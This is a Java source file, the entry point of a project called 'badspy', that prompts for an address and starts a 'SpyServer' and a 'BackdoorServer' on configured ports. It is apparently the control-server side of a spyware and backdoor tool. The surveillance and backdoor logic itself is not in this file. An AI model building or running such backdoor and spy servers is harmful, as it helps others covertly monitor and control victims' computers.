package com.blogspot.sontx.badspy.badserver;

import com.blogspot.sontx.badspy.badserver.bo.BackdoorServer;
import com.blogspot.sontx.badspy.badserver.bo.SpyServer;
import com.blogspot.sontx.jlog.Log;

import java.io.IOException;
import java.util.Scanner;

/**
 * Copyright 2016 by sontx
 * Created by sontx on 20/4/2016.
 */
public final class Program {
    private static SpyServer spyServer = null;
    private static BackdoorServer backdoorServer = null;

    private static class ShutdownHandler extends Thread {
        @Override
        public void run() {
            Log.w("Server shutdown!");
            if (spyServer != null) {
                try {
                    spyServer.close();
                } catch (IOException e) {
                }
            }
            if (backdoorServer != null) {
                try {
                    backdoorServer.close();
                } catch (IOException e) {
                }
            }
        }
    }

    private static void waitForEnterPressed() {
        try {
            System.in.read();
        } catch (IOException e) {
        }
    }

    private static void loadConfig() {
        try {
            Class.forName("com.blogspot.sontx.badspy.badserver.Config");
        } catch (ClassNotFoundException e) {
        }
    }

    public static void main(String[] args) {
        Runtime.getRuntime().addShutdownHook(new ShutdownHandler());
        loadConfig();
        Scanner scanner = new Scanner(System.in);
        System.out.print("Address: ");
        String address = scanner.nextLine();
        try {
            Log.i(String.format("Starting spy server at %s:%d ...", address, Config.SERVER_SPY_PORT));
            spyServer = new SpyServer(address, Config.SERVER_SPY_PORT);
            Log.i(String.format("Starting backdoor server at %s:%d ...", address, Config.SERVER_BACKDOOR_PORT));
            backdoorServer = new BackdoorServer(address, Config.SERVER_BACKDOOR_PORT);
            spyServer.start();
            backdoorServer.start();
        } catch (IOException e) {
            e.printStackTrace();
        }
        System.out.println("Press ENTER to quit server!");
        waitForEnterPressed();
        scanner.close();
    }
}
